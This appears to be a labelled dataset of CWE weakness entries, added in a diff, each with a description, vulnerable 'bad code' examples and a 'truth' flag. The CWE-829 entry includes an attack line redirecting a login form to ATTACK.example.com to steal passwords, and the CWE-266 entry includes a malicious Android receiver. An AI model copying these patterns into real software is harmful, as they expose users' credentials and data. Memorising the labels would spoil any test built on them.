@@ -1,0 +1,243 @@
+[
+    {
+        "id": 9,
+        "name": "CWE-9: J2EE Misconfiguration: Weak Access Permissions for EJB Methods",
+        "description": "If elevated access rights are assigned to EJB methods, then an attacker can take advantage of the permissions to exploit the software system.",
+        "ext_description": "If the EJB deployment descriptor contains one or more method permissions that grant access to the special ANYONE role, it indicates that access control for the application has not been fully thought through or that the application is structured in such a way that reasonable access control restrictions are impossible.",
+        "demonstrative_examples": "Example 1 \"The following deployment descriptor grants ANYONE permission to invoke the Employee EJB's method named getSalary().\" (bad code) Example Language: XML <ejb-jar> ... <assembly-descriptor> <method-permission> <role-name>ANYONE</role-name> <method> <ejb-name>Employee</ejb-name> <method-name>getSalary</method-name> </method-permission> </assembly-descriptor> ... </ejb-jar>",
+        "truth": false
+    },
+    {
+        "id": 32,
+        "name": "CWE-32: Path Traversal: '...' (Triple Dot)",
+        "description": "\"The software uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '...' (triple dot) sequences that can resolve to a location that is outside of that directory.\"",
+        "ext_description": "This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory. The \\'...\\' manipulation is useful for bypassing some path traversal protection schemes. On some Windows systems, it is equivalent to \"..\\\\..\" and might bypass checks that assume only two dots are valid. Incomplete filtering, such as removal of \"./\" sequences, can ultimately produce valid \"..\" sequences due to a collapse into unsafe value ( CWE-182 ).",
+        "demonstrative_examples": "",
+        "truth": false
+    },
+    {
+        "id": 106,
+        "name": "CWE-106: Struts: Plug-in Framework not in Use",
+        "description": "When an application does not use an input validation framework such as the Struts Validator, there is a greater risk of introducing weaknesses related to insufficient input validation.",
+        "ext_description": "Unchecked input is the leading cause of vulnerabilities in J2EE applications. Unchecked input leads to cross-site scripting, process control, and SQL injection vulnerabilities, among others. Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.",
+        "demonstrative_examples": "Example 1 In the following Java example the class RegistrationForm is a Struts framework ActionForm Bean that will maintain user input data from a registration webpage for an online business site. The user will enter registration data and, through the Struts framework, the RegistrationForm bean will maintain the user data. (bad code) Example Language: Java public class RegistrationForm extends org.apache.struts.action.ActionForm { // private variables for registration form private String name; private String email; ... public RegistrationForm() { super(); } // getter and setter methods for private variables ... } However, the RegistrationForm class extends the Struts ActionForm class which does use the Struts validator plug-in to provide validator capabilities. In the following example, the RegistrationForm Java class extends the ValidatorForm and Struts configuration XML file, struts-config.xml, instructs the application to use the Struts validator plug-in. (good code) Example Language: Java public class RegistrationForm extends org.apache.struts.validator.ValidatorForm { // private variables for registration form private String name; private String email; ... public RegistrationForm() { super(); } public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {...} // getter and setter methods for private variables ... } The plug-in tag of the Struts configuration XML file includes the name of the validator plug-in to be used and includes a set-property tag to instruct the application to use the file, validator-rules.xml, for default validation rules and the file, validation.XML, for custom validation. (good code) Example Language: XML <struts-config> <form-beans> <form-bean name=\"RegistrationForm\" type=\"RegistrationForm\"/> </form-beans> ... <!-- ========================= Validator plugin ================================= --> <plug-in className=\"org.apache.struts.validator.ValidatorPlugIn\"> <set-property property=\"pathnames\" value=\"/WEB-INF/validator-rules.xml,/WEB-INF/validation.xml\"/> </plug-in> </struts-config>",
+        "truth": false
+    },
+    {
+        "id": 168,
+        "name": "CWE-168: Improper Handling of Inconsistent Special Elements",
+        "description": "The software does not properly handle input in which an inconsistency exists between two or more special characters or reserved words.",
+        "ext_description": "An example of this problem would be if paired characters appear in the wrong order, or if the special characters are not properly nested.",
+        "demonstrative_examples": "",
+        "truth": true
+    },
+    {
+        "id": 194,
+        "name": "CWE-194: Unexpected Sign Extension",
+        "description": "The software performs an operation on a number that causes it to be sign extended when it is transformed into a larger data type. When the original number is negative, this can produce unexpected values that lead to resultant weaknesses.",
+        "ext_description": "",
+        "demonstrative_examples": "Example 1 The following code reads a maximum size and performs a sanity check on that size. It then performs a strncpy, assuming it will not exceed the boundaries of the array. While the use of \"short s\" is forced in this particular example, short int\\'s are frequently used within real-world code, such as code that processes structured data. (bad code) Example Language: C int GetUntrustedInt () { return(0x0000FFFF); } void main (int argc, char **argv) { char path[256]; char *input; int i; short s; unsigned int sz; i = GetUntrustedInt(); s = i; /* s is -1 so it passes the safety check - CWE-697 */ if (s > 256) { DiePainfully(\"go away!\\\\n\"); } /* s is sign-extended and saved in sz */ sz = s; /* output: i=65535, s=-1, sz=4294967295 - your mileage may vary */ printf(\"i=%d, s=%d, sz=%u\\\\n\", i, s, sz); input = GetUserInput(\"Enter pathname:\"); \"/* strncpy interprets s as unsigned int, so it's treated as MAX_INT\" ( CWE-195 ), enabling buffer overflow ( CWE-119 ) */ strncpy(path, input, s); \"path[255] = '\\\\0'; /* don't want\" CWE-170 */ printf(\"Path is: %s\\\\n\", path); } This code first exhibits an example of CWE-839 , allowing \"s\" to be a negative number. When the negative short \"s\" is converted to an unsigned integer, it becomes an extremely large positive integer. When this converted integer is used by strncpy() it will lead to a buffer overflow ( CWE-119 ).",
+        "truth": true
+    },
+    {
+        "id": 211,
+        "name": "CWE-211: Externally-Generated Error Message Containing Sensitive Information",
+        "description": "The application performs an operation that triggers an external diagnostic or error message that is not directly generated or controlled by the application, such as an error generated by the programming language interpreter that the software uses. The error can contain sensitive system information.",
+        "ext_description": "",
+        "demonstrative_examples": "",
+        "truth": true
+    },
+    {
+        "id": 266,
+        "name": "CWE-266: Incorrect Privilege Assignment",
+        "description": "A product incorrectly assigns a privilege to a particular actor, creating an unintended sphere of control for that actor.",
+        "ext_description": "",
+        "demonstrative_examples": "Example 1 The following example demonstrates the weakness. (bad code) Example Language: C seteuid(0); /* do some stuff */ seteuid(getuid()); Example 2 The following example demonstrates the weakness. (bad code) Example Language: Java AccessController.doPrivileged(new PrivilegedAction() { public Object run() { // privileged code goes here, for example: System.loadLibrary(\"awt\"); return null; // nothing to return } Example 3 This application sends a special intent with a flag that allows the receiving application to read a data file for backup purposes. (bad code) Example Language: Java Intent intent = new Intent(); intent.setAction(\"com.example.BackupUserData\"); intent.setData(file_uri); intent.addFlags(FLAG_GRANT_READ_URI_PERMISSION); sendBroadcast(intent); (attack code) Example Language: Java public class CallReceiver extends BroadcastReceiver { @Override public void onReceive(Context context, Intent intent) { Uri userData = intent.getData(); stealUserData(userData); } } \"Any malicious application can register to receive this intent. Because of the FLAG_GRANT_READ_URI_PERMISSION included with the intent, the malicious receiver code can read the user's data.\"",
+        "truth": false
+    },
+    {
+        "id": 284,
+        "name": "CWE-284: Improper Access Control",
+        "description": "The software does not restrict or incorrectly restricts access to a resource from an unauthorized actor.",
+        "ext_description": "Access control involves the use of several protection mechanisms such as: Authentication (proving the identity of an actor) Authorization (ensuring that a given actor can access a resource), and Accountability (tracking of activities that were performed) When any mechanism is not applied or otherwise fails, attackers can compromise the security of the software by gaining privileges, reading sensitive information, executing commands, evading detection, etc. There are two distinct behaviors that can introduce access control weaknesses: Specification: incorrect privileges, permissions, ownership, etc. are explicitly specified for either the user or the resource (for example, setting a password file to be world-writable, or giving administrator capabilities to a guest user). This action could be performed by the program or the administrator. Enforcement: the mechanism contains errors that prevent it from properly enforcing the specified access control requirements (e.g., allowing the user to specify their own privileges, or allowing a syntactically-incorrect ACL to produce insecure settings). This problem occurs within the program itself, in that it does not actually enforce the intended security policy that the administrator specifies.",
+        "demonstrative_examples": "",
+        "truth": true
+    },
+    {
+        "id": 317,
+        "name": "CWE-317: Cleartext Storage of Sensitive Information in GUI",
+        "description": "The application stores sensitive information in cleartext within the GUI.",
+        "ext_description": "An attacker can often obtain data from a GUI, even if hidden, by using an API to directly access GUI objects such as windows and menus. Even if the information is encoded in a way that is not human-readable, certain techniques could determine which encoding is being used, then decode the information.",
+        "demonstrative_examples": "",
+        "truth": true
+    },
+    {
+        "id": 327,
+        "name": "CWE-327: Use of a Broken or Risky Cryptographic Algorithm",
+        "description": "The use of a broken or risky cryptographic algorithm is an unnecessary risk that may result in the exposure of sensitive information.",
+        "ext_description": "The use of a non-standard algorithm is dangerous because a determined attacker may be able to break the algorithm and compromise whatever data has been protected. Well-known techniques may exist to break the algorithm.",
+        "demonstrative_examples": "Example 1 These code examples use the Data Encryption Standard (DES). (bad code) Example Language: C EVP_des_ecb(); (bad code) Example Language: Java Cipher des=Cipher.getInstance(\"DES...\"); des.initEncrypt(key2); (bad code) Example Language: PHP function encryptPassword($password){ $iv_size = mcrypt_get_iv_size(MCRYPT_DES, MCRYPT_MODE_ECB); $iv = mcrypt_create_iv($iv_size, MCRYPT_RAND); $key = \"This is a password encryption key\"; $encryptedPassword = mcrypt_encrypt(MCRYPT_DES, $key, $password, MCRYPT_MODE_ECB, $iv); return $encryptedPassword; } Once considered a strong algorithm, DES now regarded as insufficient for many applications. It has been replaced by Advanced Encryption Standard (AES).",
+        "truth": false
+    },
+    {
+        "id": 368,
+        "name": "CWE-368: Context Switching Race Condition",
+        "description": "\"A product performs a series of non-atomic actions to switch between contexts that cross privilege or other security boundaries, but a race condition allows an attacker to modify or misrepresent the product's behavior during the switch.\"",
+        "ext_description": "This is commonly seen in web browser vulnerabilities in which the attacker can perform certain actions while the browser is transitioning from a trusted to an untrusted domain, or vice versa, and the browser performs the actions on one domain using the trust level and resources of the other domain.",
+        "demonstrative_examples": "",
+        "truth": false
+    },
+    {
+        "id": 406,
+        "name": "CWE-406: Insufficient Control of Network Message Volume (Network Amplification)",
+        "description": "The software does not sufficiently monitor or control transmitted network traffic volume, so that an actor can cause the software to transmit more traffic than should be allowed for that actor.",
+        "ext_description": "\"In the absence of a policy to restrict asymmetric resource consumption, the application or system cannot distinguish between legitimate transmissions and traffic intended to serve as an amplifying attack on target systems. Systems can often be configured to restrict the amount of traffic sent out on behalf of a client, based on the client's origin or access level. This is usually defined in a resource allocation policy. In the absence of a mechanism to keep track of transmissions, the system or application can be easily abused to transmit asymmetrically greater traffic than the request or client should be permitted to.\"",
+        "demonstrative_examples": "Example 1 This code listens on a port for DNS requests and sends the result to the requesting address. (bad code) Example Language: Python sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) sock.bind( (UDP_IP,UDP_PORT) ) while true: data = sock.recvfrom(1024) if not data: break (requestIP, nameToResolve) = parseUDPpacket(data) record = resolveName(nameToResolve) sendResponse(requestIP,record) \"This code sends a DNS record to a requesting IP address. UDP allows the source IP address to be easily changed ('spoofed'), thus allowing an attacker to redirect responses to a target, which may be then be overwhelmed by the network traffic.\"",
+        "truth": true
+    },
+    {
+        "id": 447,
+        "name": "CWE-447: Unimplemented or Unsupported Feature in UI",
+        "description": "A UI function for a security feature appears to be supported and gives feedback to the user that suggests that it is supported, but the underlying functionality is not implemented.",
+        "ext_description": "",
+        "demonstrative_examples": "",
+        "truth": false
+    },
+    {
+        "id": 453,
+        "name": "CWE-453: Insecure Default Variable Initialization",
+        "description": "The software, by default, initializes an internal variable with an insecure or less secure value than is possible.",
+        "ext_description": "",
+        "demonstrative_examples": "Example 1 This code attempts to login a user using credentials from a POST request: (bad code) Example Language: PHP // $user and $pass automatically set from POST request if (login_user($user,$pass)) { $authorized = true; } ... if ($authorized) { generatePage(); } \"Because the $authorized variable is never initialized, PHP will automatically set $authorized to any value included in the POST request if register_globals is enabled. An attacker can send a POST request with an unexpected third value 'authorized' set to 'true' and gain authorized status without supplying valid credentials.\" Here is a fixed version: (bad code) Example Language: PHP \"$user = $_POST['user'];\" \"$pass = $_POST['pass'];\" $authorized = false; if (login_user($user,$pass)) { $authorized = true; } ... This code avoids the issue by initializing the $authorized variable to false and explicitly retrieving the login credentials from the $_POST variable. Regardless, register_globals should never be enabled and is disabled by default in current versions of PHP.",
+        "truth": false
+    },
+    {
+        "id": 476,
+        "name": "CWE-476: NULL Pointer Dereference",
+        "description": "A NULL pointer dereference occurs when the application dereferences a pointer that it expects to be valid, but is NULL, typically causing a crash or exit.",
+        "ext_description": "NULL pointer dereference issues can occur through a number of flaws, including race conditions, and simple programming omissions.",
+        "demonstrative_examples": "Example 1 While there are no complete fixes aside from conscientious programming, the following steps will go a long way to ensure that NULL pointer dereferences do not occur. (good code) if (pointer1 != NULL) { /* make use of pointer1 */ /* ... */ } If you are working with a multithreaded or otherwise asynchronous environment, ensure that proper locking APIs are used to lock before the if statement; and unlock when it has finished. Example 2 This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer. (bad code) Example Language: C void host_lookup(char *user_supplied_addr){ struct hostent *hp; in_addr_t *addr; char hostname[64]; in_addr_t inet_addr(const char *cp); /*routine that ensures user_supplied_addr is in the right format for conversion */ validate_addr_form(user_supplied_addr); addr = inet_addr(user_supplied_addr); hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET); strcpy(hostname, hp->h_name); } If an attacker provides an address that appears to be well-formed, but the address does not resolve to a hostname, then the call to gethostbyaddr() will return NULL. Since the code does not check the return value from gethostbyaddr ( CWE-252 ), a NULL pointer dereference ( CWE-476 ) would then occur in the call to strcpy(). Note that this code is also vulnerable to a buffer overflow ( CWE-119 ). Example 3 In the following code, the programmer assumes that the system always has a property named \"cmd\" defined. If an attacker can control the program\\'s environment so that \"cmd\" is not defined, the program throws a NULL pointer exception when it attempts to call the trim() method. (bad code) Example Language: Java String cmd = System.getProperty(\"cmd\"); cmd = cmd.trim(); Example 4 This Android application has registered to handle a URL when sent an intent: (bad code) Example Language: Java ... IntentFilter filter = new IntentFilter(\"com.example.URLHandler.openURL\"); MyReceiver receiver = new MyReceiver(); registerReceiver(receiver, filter); ... public class UrlHandlerReceiver extends BroadcastReceiver { @Override public void onReceive(Context context, Intent intent) { if(\"com.example.URLHandler.openURL\".equals(intent.getAction())) { String URL = intent.getStringExtra(\"URLToOpen\"); int length = URL.length(); ... } } } The application assumes the URL will always be included in the intent. When the URL is not present, the call to getStringExtra() will return null, thus causing a null pointer exception when length() is called.",
+        "truth": false
+    },
+    {
+        "id": 537,
+        "name": "CWE-537: Java Runtime Error Message Containing Sensitive Information",
+        "description": "In many cases, an attacker can leverage the conditions that cause unhandled exception errors in order to gain unauthorized access to the system.",
+        "ext_description": "",
+        "demonstrative_examples": "Example 1 In the following Java example the class InputFileRead enables an input file to be read using a FileReader object. In the constructor of this class a default input file path is set to some directory on the local file system and the method setInputFile must be called to set the name of the input file to be read in the default directory. The method readInputFile will create the FileReader object and will read the contents of the file. If the method setInputFile is not called prior to calling the method readInputFile then the File object will remain null when initializing the FileReader object. A Java RuntimeException will be raised, and an error message will be output to the user. (bad code) Example Language: Java public class InputFileRead { private File readFile = null; private FileReader reader = null; private String inputFilePath = null; private final String DEFAULT_FILE_PATH = \"c:\\\\\\\\somedirectory\\\\\\\\\"; public InputFileRead() { inputFilePath = DEFAULT_FILE_PATH; } public void setInputFile(String inputFile) { /* Assume appropriate validation / encoding is used and privileges / permissions are preserved */ } public void readInputFile() { try { reader = new FileReader(readFile); ... } catch (RuntimeException rex) { System.err.println(\"Error: Cannot open input file in the directory \" + inputFilePath); System.err.println(\"Input file has not been set, call setInputFile method before calling readInputFile\"); } catch (FileNotFoundException ex) {...} } } However, the error message output to the user contains information regarding the default directory on the local file system. This information can be exploited and may lead to unauthorized access or use of the system. Any Java RuntimeExceptions that are handled should not expose sensitive information to the user. Example 2 In the example below, the BankManagerLoginServlet servlet class will process a login request to determine if a user is authorized to use the BankManager Web service. The doPost method will retrieve the username and password from the servlet request and will determine if the user is authorized. If the user is authorized the servlet will go to the successful login page. Otherwise, the servlet will raise a FailedLoginException and output the failed login message to the error page of the service. (bad code) Example Language: Java public class BankManagerLoginServlet extends HttpServlet { protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { try { // Get username and password from login page request String username = request.getParameter(\"username\"); String password = request.getParameter(\"password\"); // Authenticate user BankManager bankMgr = new BankManager(); boolean isAuthentic = bankMgr.authenticateUser(username, password); // If user is authenticated then go to successful login page if (isAuthentic) { request.setAttribute(\"login\", new String(\"Login Successful.\")); getServletContext().getRequestDispatcher(\"/BankManagerServiceLoggedIn.jsp\"). forward(request, response); } else { // Otherwise, raise failed login exception and output unsuccessful login message to error page throw new FailedLoginException(\"Failed Login for user \" + username + \" with password \" + password); } } catch (FailedLoginException ex) { // output failed login message to error page request.setAttribute(\"error\", new String(\"Login Error\")); request.setAttribute(\"message\", ex.getMessage()); getServletContext().getRequestDispatcher(\"/ErrorPage.jsp\").forward(request, response); } } \"However, the output message generated by the FailedLoginException includes the user-supplied password. Even if the password is erroneous, it is probably close to the correct password. Since it is printed to the user's page, anybody who can see the screen display will be able to see the password. Also, if the page is cached, the password might be written to disk.\"",
+        "truth": false
+    },
+    {
+        "id": 576,
+        "name": "CWE-576: EJB Bad Practices: Use of Java I/O",
+        "description": "The program violates the Enterprise JavaBeans (EJB) specification by using the java.io package.",
+        "ext_description": "The Enterprise JavaBeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any EJB container. In this case, the program violates the following EJB guideline: \"An enterprise bean must not use the java.io package to attempt to access files and directories in the file system.\" The specification justifies this requirement in the following way: \"The file system APIs are not well-suited for business components to access data. Business components should use a resource manager API, such as JDBC, to store data.\"",
+        "demonstrative_examples": "Example 1 The following Java example is a simple stateless Enterprise JavaBean that retrieves the interest rate for the number of points for a mortgage. In this example, the interest rates for various points are retrieved from an XML document on the local file system, and the EJB uses the Java I/O API to retrieve the XML document from the local file system. (bad code) Example Language: Java @Stateless public class InterestRateBean implements InterestRateRemote { private Document interestRateXMLDocument = null; private File interestRateFile = null; public InterestRateBean() { try { /* get XML document from the local filesystem */ interestRateFile = new File(Constants.INTEREST_RATE_FILE); if (interestRateFile.exists()) { DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); DocumentBuilder db = dbf.newDocumentBuilder(); interestRateXMLDocument = db.parse(interestRateFile); } } catch (IOException ex) {...} } public BigDecimal getInterestRate(Integer points) { return getInterestRateFromXML(points); } /* member function to retrieve interest rate from XML document on the local file system */ private BigDecimal getInterestRateFromXML(Integer points) {...} } This use of the Java I/O API within any kind of Enterprise JavaBean violates the EJB specification by using the java.io package for accessing files within the local filesystem. An Enterprise JavaBean should use a resource manager API for storing and accessing data. In the following example, the private member function getInterestRateFromXMLParser uses an XML parser API to retrieve the interest rates. (good code) Example Language: Java @Stateless public class InterestRateBean implements InterestRateRemote { public InterestRateBean() { } public BigDecimal getInterestRate(Integer points) { return getInterestRateFromXMLParser(points); } /* member function to retrieve interest rate from XML document using an XML parser API */ private BigDecimal getInterestRateFromXMLParser(Integer points) {...} }",
+        "truth": false
+    },
+    {
+        "id": 606,
+        "name": "CWE-606: Unchecked Input for Loop Condition",
+        "description": "The product does not properly check inputs that are used for loop conditions, potentially leading to a denial of service or other consequences because of excessive looping.",
+        "ext_description": "",
+        "demonstrative_examples": "Example 1 The following example demonstrates the weakness. (bad code) Example Language: C void iterate(int n){ int i; for (i = 0; i < n; i++){ foo(); } } void iterateFoo() { unsigned int num; scanf(\"%u\",&num); iterate(num); } Example 2 In the following C/C++ example the method processMessageFromSocket() will get a message from a socket, placed into a buffer, and will parse the contents of the buffer into a structure that contains the message length and the message body. A for loop is used to copy the message body into a local character string which will be passed to another method for processing. (bad code) Example Language: C int processMessageFromSocket(int socket) { int success; char buffer[BUFFER_SIZE]; char message[MESSAGE_SIZE]; // get message from socket and store into buffer //Ignoring possibliity that buffer > BUFFER_SIZE if (getMessage(socket, buffer, BUFFER_SIZE) > 0) { // place contents of the buffer into message structure ExMessage *msg = recastBuffer(buffer); // copy message body into string for processing int index; for (index = 0; index < msg->msgLength; index++) { message[index] = msg->msgBody[index]; } \"message[index] = '\\\\0';\" // process message success = processMessage(message); } return success; } However, the message length variable from the structure is used as the condition for ending the for loop without validating that the message length variable accurately reflects the length of the message body ( CWE-606 ). This can result in a buffer over-read ( CWE-125 ) by reading from memory beyond the bounds of the buffer if the message length variable indicates a length that is longer than the size of a message body ( CWE-130 ).",
+        "truth": false
+    },
+    {
+        "id": 665,
+        "name": "CWE-665: Improper Initialization",
+        "description": "The software does not initialize or incorrectly initializes a resource, which might leave the resource in an unexpected state when it is accessed or used.",
+        "ext_description": "This can have security implications when the associated resource is expected to have certain properties or values, such as a variable that determines whether a user has been authenticated or not.",
+        "demonstrative_examples": "Example 1 Here, a boolean initiailized field is consulted to ensure that initialization tasks are only completed once. However, the field is mistakenly set to true during static initialization, so the initialization code is never reached. (bad code) Example Language: Java private boolean initialized = true; public void someMethod() { if (!initialized) { // perform initialization tasks ... initialized = true; } Example 2 The following code intends to limit certain operations to the administrator only. (bad code) Example Language: Perl $username = GetCurrentUser(); $state = GetStateData($username); if (defined($state)) { $uid = ExtractUserID($state); } # do stuff if ($uid == 0) { DoAdminThings(); } If the application is unable to extract the state information - say, due to a database timeout - then the $uid variable will not be explicitly set by the programmer. This will cause $uid to be regarded as equivalent to \"0\" in the conditional, allowing the original user to perform administrator actions. Even if the attacker cannot directly influence the state data, unexpected errors could cause incorrect privileges to be assigned to a user just by accident. Example 3 The following code intends to concatenate a string to a variable and print the string. (bad code) Example Language: C char str[20]; strcat(str, \"hello world\"); printf(\"%s\", str); This might seem innocent enough, but str was not initialized, so it contains random memory. As a result, str[0] might not contain the null terminator, so the copy might start at an offset other than 0. The consequences can vary, depending on the underlying memory. If a null terminator is found before str[8], then some bytes of random garbage will be printed before the \"hello world\" string. The memory might contain sensitive information from previous uses, such as a password (which might occur as a result of CWE-14 or CWE-244 ). In this example, it might not be a big deal, but consider what could happen if large amounts of memory are printed out before the null terminator is found. \"If a null terminator isn't found before str[8], then a buffer overflow could occur, since strcat will first look for the null terminator, then copy 12 bytes starting with that location. Alternately, a buffer over-read might occur (\" CWE-126 \") if a null terminator isn't found before the end of the memory segment is reached, leading to a segmentation fault and crash.\"",
+        "truth": false
+        
+    },
+    {
+        "id": 669,
+        "name": "CWE-669: Incorrect Resource Transfer Between Spheres",
+        "description": "The product does not properly transfer a resource/behavior to another sphere, or improperly imports a resource/behavior from another sphere, in a manner that provides unintended control over that resource.",
+        "ext_description": "",
+        "demonstrative_examples": "",
+        "truth": false
+    },
+    {
+        "id": 688,
+        "name": "CWE-688: Function Call With Incorrect Variable or Reference as Argument",
+        "description": "The software calls a function, procedure, or routine, but the caller specifies the wrong variable or reference as one of the arguments, which may lead to undefined behavior and resultant weaknesses.",
+        "ext_description": "",
+        "demonstrative_examples": "Example 1 In the following Java snippet, the accessGranted() method is accidentally called with the static ADMIN_ROLES array rather than the user roles. (bad code) Example Language: Java private static final String[] ADMIN_ROLES = ...; public boolean void accessGranted(String resource, String user) { String[] userRoles = getUserRoles(user); return accessGranted(resource, ADMIN_ROLES); } private boolean void accessGranted(String resource, String[] userRoles) { // grant or deny access based on user roles ... }","truth": true
+    },
+    {
+        "id": 704,
+        "name": "CWE-704: Incorrect Type Conversion or Cast",
+        "description": "The software does not correctly convert an object, resource, or structure from one type to a different type.",
+        "ext_description": "",
+        "demonstrative_examples": "",
+        "truth": true
+
+    },
+    {
+        "id": 710,
+        "name": "CWE-710: Improper Adherence to Coding Standards",
+        "description": "The software does not follow certain coding rules for development, which can lead to resultant weaknesses or increase the severity of the associated vulnerabilities.",
+        "ext_description": "",
+        "demonstrative_examples": "",
+        "truth": false
+    },
+    {
+        "id": 779,
+        "name": "CWE-779: Logging of Excessive Data",
+        "description": "The software logs too much information, making log files hard to process and possibly hindering recovery efforts or forensic analysis after an attack.",
+        "ext_description": "\"While logging is a good practice in general, and very high levels of logging are appropriate for debugging stages of development, too much logging in a production environment might hinder a system administrator's ability to detect anomalous conditions. This can provide cover for an attacker while attempting to penetrate a system, clutter the audit trail for forensic analysis, or make it more difficult to debug problems in a production environment.\"",
+        "demonstrative_examples": "",
+        "truth": false
+    },
+    {
+        "id": 829,
+        "name": "CWE-829: Inclusion of Functionality from Untrusted Control Sphere",
+        "description": "The software imports, requires, or includes executable functionality (such as a library) from a source that is outside of the intended control sphere.",
+        "ext_description": "When including third-party functionality, such as a web widget, library, or other source of functionality, the software must effectively trust that functionality. Without sufficient protection mechanisms, the functionality could be malicious in nature (either by coming from an untrusted source, being spoofed, or being modified in transit from a trusted source). The functionality might also contain its own weaknesses, or grant access to additional functionality and state information that should be kept private to the base system, such as system state information, sensitive application data, or the DOM of a web application. \"This might lead to many different consequences depending on the included functionality, but some examples include injection of malware, information exposure by granting excessive privileges or permissions to the untrusted functionality, DOM-based XSS vulnerabilities, stealing user's cookies, or open redirect to malware (\" CWE-601 ).",
+        "demonstrative_examples": "Example 1 This login webpage includes a weather widget from an external website: (bad code) Example Language: HTML <div class=\"header\"> Welcome! <div id=\"loginBox\">Please Login: <form id =\"loginForm\" name=\"loginForm\" action=\"login.php\" method=\"post\"> Username: <input type=\"text\" name=\"username\" /> <br/> Password: <input type=\"password\" name=\"password\" /> <input type=\"submit\" value=\"Login\" /> </form> </div> <div id=\"WeatherWidget\"> <script type=\"text/javascript\" src=\"externalDomain.example.com/weatherwidget.js\"></script> </div> </div> This webpage is now only as secure as the external domain it is including functionality from. If an attacker compromised the external domain and could add malicious scripts to the weatherwidget.js file, the attacker would have complete control, as seen in any XSS weakness ( CWE-79 ). For example, user login information could easily be stolen with a single line added to weatherwidget.js: (attack code) Example Language: JavaScript ...Weather widget code.... document.getElementById(\\'loginForm\\').action = \"ATTACK.example.com/stealPassword.php\"; \"This line of javascript changes the login form's original action target from the original website to an attack site. As a result, if a user attempts to login their username and password will be sent directly to the attack site.\"",
+        "truth": false
+    },
+    {
+        "id": 833,
+        "name": "CWE-833: Deadlock",
+        "description": "The software contains multiple threads or executable segments that are waiting for each other to release a necessary lock, resulting in deadlock.",
+        "ext_description": "",
+        "demonstrative_examples": "",
+        "truth": false
+    },
+    {
+        "id": 1124,
+        "name": "CWE-1124: Excessively Deep Nesting",
+        "description": "The code contains a callable or other code grouping in which the nesting / branching is too deep.",
+        "ext_description": "This issue makes it more difficult to maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",
+        "demonstrative_examples": "",
+        "truth": false
+    },
+    {
+        "id": 1234,
+        "name": "CWE-1234: Hardware Internal or Debug Modes Allow Override of Locks",
+        "description": "System configuration protection may be bypassed during debug mode.",
+        "ext_description": "Device configuration controls are commonly programmed after a device power reset by a trusted firmware or software module (e.g., BIOS/bootloader) and then locked from any further modification. This is commonly implemented using a trusted lock bit, which when set, disables writes to a protected set of registers or address regions. The lock protection is intended to prevent modification of certain system configuration (e.g., memory/memory protection unit configuration). If debug features supported by hardware or internal modes/system states are supported in the hardware design, modification of the lock protection may be allowed allowing access and modification of configuration information.",
+        "demonstrative_examples": "Example 1 For example, consider the example Locked_override_register example. This register module supports a lock mode that blocks any writes after lock is set to 1. However, it also allows override of the lock protection when scan_mode or debug_unlocked modes are active. (bad code) Example Language: Verilog module Locked_register_example ( input [15:0] Data_in, input Clk, input resetn, input write, input Lock, input scan_mode, input debug_unlocked, output reg [15:0] Data_out ); reg lock_status; always @(posedge Clk or negedge resetn) if (~resetn) // Register is reset resetn begin \"lock_status <= 1'b0;\" end else if (Lock) begin \"lock_status <= 1'b1;\" end else if (~Lock) begin lock_status <= lock_status end always @(posedge Clk or negedge resetn) if (~resetn) // Register is reset resetn begin \"Data_out <= 16'h0000;\" end else if (write & (~lock_status | scan_mode | debug_unlocked) ) // Register protected by Lock bit input, overrides supported for scan_mode & debug_unlocked begin Data_out <= Data_in; end else if (~write) begin Data_out <= Data_out; end endmodule If either the scan_mode or the debug_unlocked modes can be triggered by software, then the lock protection may be bypassed. (good code) Either remove the debug and scan mode overrides or protect enabling of these modes so that only trusted and authorized users may enable these modes.",
+        "truth": false
+    },
+    {
+        "id": 1239,
+        "name": "CWE-1239: Improper Zeroization of Hardware Register",
+        "description": "The hardware product does not properly clear sensitive information from built-in registers when the user of the hardware block changes.",
+        "ext_description": "Hardware logic operates on data stored in registers local to the hardware block. Most hardware IPs, including cryptographic accelerators, rely on registers to buffer I/O, store intermediate values, and interface with software. The result of this is that sensitive information, such as passwords or encryption keys, can exist in locations not transparent to the user of the hardware logic. When a different entity obtains access to the IP due to a change in operating mode or conditions, the new entity can extract information belonging to the previous user if no mechanisms are in place to clear register contents. It is important to clear information stored in the hardware if a physical attack on the product is detected, or if the user of the hardware block changes. The process of clearing register contents in a hardware IP is referred to as zeroization in standards for cryptographic hardware modules such as FIPS-140-2 [ REF-267 ].",
+        "demonstrative_examples": "Example 1 Suppose a hardware IP for implementing an encryption routine works as expected, but it leaves the intermediate results in some registers that can be accessed. Exactly why this access happens is immaterial - it might be unintentional or intentional, where the designer wanted a \"quick fix\" for something.",
+        "truth": false
+    },
+    {
+        "id": 1322,
+        "name": "CWE-1322: Use of Blocking Code in Single-threaded, Non-blocking Context",
+        "description": "The product uses a non-blocking model that relies on a single threaded process for features such as scalability, but it contains code that can block when it is invoked.",
+        "ext_description": "When an attacker can directly invoke the blocking code, or the blocking code can be affected by environmental conditions that can be influenced by an attacker, then this can lead to a denial of service by causing unexpected hang or freeze of the code. Examples of blocking code might be an expensive computation or calling blocking library calls, such as those that perform exclusive file operations or require a successful network operation. Due to limitations in multi-thread models, single-threaded models are used to overcome the resource constraints that are caused by using many threads. In such a model, all code should generally be non-blocking. If blocking code is called, then the event loop will effectively be stopped, which can be undesirable or dangerous. Such models are used in Python asyncio, Vert.x, and Node.js, or other custom event loop code.",
+        "demonstrative_examples": "",
+        "truth": false
+    }
+]
